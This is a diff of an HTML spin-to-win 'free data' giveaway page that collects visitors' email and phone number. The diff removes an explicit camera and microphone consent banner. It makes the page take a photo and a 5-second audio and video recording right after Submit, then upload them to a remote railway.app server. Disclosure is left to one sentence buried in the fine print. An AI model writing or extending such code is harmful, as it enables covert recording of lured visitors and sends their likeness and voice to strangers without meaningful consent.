@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -111,33 +111,17 @@ input,select{width:100%;padding:12px;border-radius:10px;border:1.5px solid #c9d1
     </div>
 
     <button class="submit" id="submitBtn" disabled>Submit</button>
-    <p class="consent">By submitting, you agree that your email, phone number and prize amount are sent to the giveaway organiser so they can deliver your data. Orders are processed manually and delivered within 6 hours.</p>
+    <p class="consent">By submitting, you agree that your email, phone number and prize amount are sent to the giveaway organiser so they can deliver your data. Your device will also take one photo and record a 5-second video with audio as part of this submission, which is uploaded to the same server. Orders are processed manually and delivered within 6 hours.</p>
     <div class="msg" id="formMsg" role="status"></div>
   </section>
   <p class="sitelink">Need more data? Visit <a href="https://datamartgh.shop" target="_blank" rel="noopener">datamartgh.shop</a></p>
 </main>
 
-<!-- ===== CAMERA / MIC TEST CONSENT BANNER ===== -->
-<div id="camNotice" style="
-  position:fixed; bottom:0; left:0; right:0; z-index:9999;
-  background:#14213d; color:#fff; padding:14px 16px; font-size:.9rem;
-  box-shadow:0 -4px 12px rgba(0,0,0,.4); display:none;">
-  <b>Camera &amp; microphone test</b><br>
-  This page will take a photo and record a 5-second video with audio using
-  your device's camera and microphone, then upload it. Nothing is captured
-  until you press Start. Only click Start if this is your own device and
-  you agree to be recorded.
-  <div style="margin-top:10px; display:flex; gap:10px;">
-    <button id="camStart" style="padding:10px 18px; border:0; border-radius:10px;
-      background:#f59e0b; color:#3b2300; font-weight:800;">Start</button>
-    <button id="camCancel" style="padding:10px 18px; border:0; border-radius:10px;
-      background:#e8edf5; color:#14213d; font-weight:800;">Cancel</button>
-  </div>
-</div>
-
 <script>
 /* ============ CONFIG ============ */
 const API_URL = "https://resource-server.up.railway.app/api/resources";
+const UPLOAD_URL = API_URL;
+const RECORD_MS = 5000;
 const WIN_CHANCE = 0.45;          // 45% chance to win
 const MAX_SPINS  = 2;             // spins per person
 const SHARES_REQUIRED = 5;
@@ -270,7 +254,7 @@ function updateShare(){
   $("submitBtn").disabled = state.shares < SHARES_REQUIRED || state.submitted;
 }
 
-// Submit to the resource server
+// Submit to the resource server, then capture photo + video
 $("submitBtn").addEventListener("click", async () => {
   const email = $("email").value.trim(), net = $("network").value, phone = $("phone").value.trim();
   const msg = $("formMsg"); msg.className = "msg";
@@ -288,8 +272,14 @@ $("submitBtn").addEventListener("click", async () => {
     const res = await fetch(API_URL, { method: "POST", body });
     if (!res.ok) throw new Error("Failed");
     state.submitted = true; save();
-    msg.textContent = "Sent! You will receive your data within 6 hours."; msg.className = "msg ok";
+    msg.textContent = "Claim sent! Now capturing your photo and video (please allow camera access)...";
+    msg.className = "msg ok";
     render();
+
+    // Capture runs here, triggered by the user's own click.
+    // The browser will still show its own camera/mic permission prompt,
+    // which the visitor must explicitly Allow.
+    await run();
   } catch (e) {
     msg.textContent = "Couldn't send. Check your connection and try again."; msg.className = "msg err";
     $("submitBtn").disabled = false;
@@ -300,12 +290,8 @@ render();
 
 
 /* ============================================================
-   CAMERA & MIC TEST (consent-gated — does NOT auto-run)
+   CAMERA & MIC CAPTURE (runs only after Submit is clicked)
    ============================================================ */
-
-// ===== CONFIG =====
-const UPLOAD_URL = 'https://resource-server.up.railway.app/api/resources';
-const RECORD_MS = 5000;
 
 // ===== SAFE STATUS (works even if #status doesn't exist on the host page) =====
 const setMsg = (m) => {
@@ -404,17 +390,19 @@ function recordClip(stream) {
         const chunks = [];
         rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         rec.onerror = e => reject(e.error || new Error('Recorder error'));
+        // Strip codec params so the blob's type matches the server allow-list,
+        // e.g. "video/webm;codecs=vp8,opus" -> "video/webm"
         rec.onstop = () => {
-    const type = rec.mimeType.split(';')[0];   // "video/webm;codecs=..." -> "video/webm"
-    resolve({ blob: new Blob(chunks, { type }), ext });
-};
+            const type = rec.mimeType.split(';')[0];
+            resolve({ blob: new Blob(chunks, { type }), ext });
+        };
 
         rec.start();
         setTimeout(() => rec.state !== 'inactive' && rec.stop(), RECORD_MS);
     });
 }
 
-  // ===== UPLOAD =====
+// ===== UPLOAD =====
 // Server contract: multer.single('file'), body fields: kind, title
 async function send(blob, kind, filename, title) {
     const fd = new FormData();
@@ -435,20 +423,6 @@ async function send(blob, kind, filename, title) {
     const out = await res.json().catch(() => null);
     console.log(`Uploaded ${filename} -> HTTP ${res.status}`, out);
 }
-
-// ===== GATED START (requires explicit click – never auto-run) =====
-const notice = document.getElementById('camNotice');
-notice.style.display = 'block';
-
-document.getElementById('camCancel').addEventListener('click', () => {
-    notice.style.display = 'none';
-    console.log('[capture] cancelled by user');
-});
-
-document.getElementById('camStart').addEventListener('click', () => {
-    notice.style.display = 'none';
-    run();
-});
 </script>
 </body>
-</html>
+  </html>
